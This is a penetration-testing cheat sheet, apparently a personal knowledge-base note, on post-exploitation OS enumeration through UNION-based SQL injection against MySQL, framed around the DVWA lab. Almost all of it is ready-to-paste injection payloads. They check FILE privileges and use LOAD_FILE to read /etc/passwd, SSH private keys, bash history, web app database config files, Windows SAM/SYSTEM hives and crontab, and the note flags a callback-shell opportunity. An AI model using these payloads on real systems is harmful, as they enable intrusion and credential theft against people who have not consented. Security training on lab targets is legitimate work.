---
author(s):
  - Userware
tags:
  - webapp-pentesting
  - post-exploitation
  - server-side-attack
  - sql-injection
  - union
  - enumeration-and-discovery
  - privilege-escalation
  - credential-access-and-dumping
  - dvwa
---
# 03 - OS Enumeration

> [!IMPORTANT] Conditions
> The DB user must have **FILE** and **SELECT** privileges perform with the flags `--privileges -U CU`.
> > [!NOTE]
> > Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

## 3.1 - Enumerate Database User Privileges

```sql
' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv, '\n') FROM mysql.user#

' UNION SELECT NULL, GROUP_CONCAT(user, '->', 'FILE', '->', File_priv, '\n') FROM mysql.user WHERE File_priv = 'Y' AND user = 'dvwa'#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#

' UNION SELECT NULL, GROUP_CONCAT(PRIVILEGE_TYPE, '->', GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES WHERE PRIVILEGE_TYPE LIKE 'SELECT' OR PRIVILEGE_TYPE OR 'FILE' AND GRANTEE LIKE "'dvwa'%"#
```

## 3.2 - Basic Information

### 3.2.1 - Linux

Enumerate hostname

```sql
' UNION SELECT NULL, @@HOSTNAME#

' UNION SELECT NULL, LOAD_FILE('/etc/hostname')#
```

Enumerate user accounts

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/passwd')#
```

Enumerate user groups

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/group')#
```

Local IPv4 address

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/network/interfaces')#

' UNION SELECT NULL, LOAD_FILE('/etc/sysconfig/network')#

' UNION SELECT NULL, LOAD_FILE('/etc/networks')#
```

DNS resolve and nameserver IPs

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/resolv.conf')#

' UNION SELECT NULL, LOAD_FILE('/etc/hosts')#
```

Environment variables may contain **sensitive information**. You never know that sometimes the sysadmins can be lazy sometimes.

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/profile')#

' UNION SELECT NULL, LOAD_FILE('/etc/bash.bashrc')#

' UNION SELECT NULL, LOAD_FILE('/home/<username>/.bash_profile')#

' UNION SELECT NULL, LOAD_FILE('/root/.bash_profile')#

' UNION SELECT NULL, LOAD_FILE('/home/<username>/.bashrc')#

' UNION SELECT NULL, LOAD_FILE('/root/.bashrc')#
```

Enumerate installed packages that will give you an idea of what services are installed.

```sql
' UNION SELECT NULL, LOAD_FILE('/var/log/dpkg.log')#

' UNION SELECT NULL, LOAD_FILE('/var/log/yum.log')#
```

Enumerate kernel version

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/lsb-release')#

' UNION SELECT NULL, LOAD_FILE('/etc/os-release')#

' UNION SELECT NULL, LOAD_FILE('/proc/version')#
```

### 3.2.2 - Windows

```sql
' UNION SELECT NULL, LOAD_FILE('c:/windows/win.ini')#

' UNION SELECT NULL, LOAD_FILE('c:/xampp/php/php.ini')#
```

DNS resolve and nameserver IPs

```sql
' UNION SELECT NULL, LOAD_FILE('c:/Windows/system32/drivers/etc/hosts')#
```

## 3.3 - Credentials

### 3.3.1 - Linux

Retrieve SSH keys

```sql
' UNION SELECT NULL, LOAD_FILE('/home/<username>/.ssh/id_rsa')#

' UNION SELECT NULL, LOAD_FILE('/root/.ssh/id_rsa')#
```

Retrieve database config file. You have to lookup of what web technology it's using such as, a **content management system (CMS)** like wordpress. Find the absolute path of the [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/Credentials/Config Files/Webapps/Living off the Land#^bc9e6e|database config file]] after enumeration phase for the web root directory.

```sql
' UNION SELECT NULL, LOAD_FILE('/var/www/html/dvwa/config.php')#
```

- Retrieve history commands. You can find more in the [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/Credentials/Config Files/Webapps/Living off the Land|privilege escalation credentials]] section.

```sql
' UNION SELECT NULL, LOAD_FILE('/home/<username>/.ssh/.bash_history')#

' UNION SELECT NULL, LOAD_FILE('/root/.ssh/.bash_history')#
```

### 3.3.2 - Windows

```sql
' UNION SELECT NULL, LOAD_FILE('C:/Windows/Repair/SAM')#

' UNION SELECT NULL, LOAD_FILE('C:/Windows/Repair/SYSTEM')#

' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/config/security')#
           
' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/config/system')#

' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/config/sam')#
```

## 3.4 - Privilege Escalation

### 3.4.1 - Linux

CronJobs may contain backup files that is worth **harvesting the data**. Moreover, there is a possible attack vector to spawn a callback shell. Be on the lookout.

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/crontab')#
```

## 3.5 - Config Files

### 3.5.1 - Linux

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/ssh/sshd_config')#
```

## 3.6 - Hardware

Enumerate mounted drives and network shares.

```sql
' UNION SELECT NULL, LOAD_FILE('/etc/fstab')#
```

Enumerate CPU cores

```sql
' UNION SELECT NULL, LOAD_FILE('/proc/cpuinfo')#
```

---
## References

### Linux

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xA - Users/Manual/Living off the Land|Enumeration and Discovery: Users]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xG - Log Files/Manual/Living off the Land|Enumeration and Discovery: Log Files]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xM - System and Kernel Version/Manual/Living off the Land|Enumeration and Discovery: System and Kernel Version]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xC - Scheduled Tasks/Cron Job/Manual/Living off the Land|Enumeration and Discovery: Cron Job]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Linux/Local Privilege Escalation/Credentials/Config Files/Webapps/Living off the Land|Privilege Escalation: Content Management System (CMS)]]

### Windows

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Windows/Host/0xC - IP Address/Manual/Living off the Land|Enumeration and Discovery: IP Address]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x04 - Credential Access and Dumping/Windows/Host/Registry/Hashdump/01 - Manual/Living off the Land|Credential Access and Dumping: Hashdump]]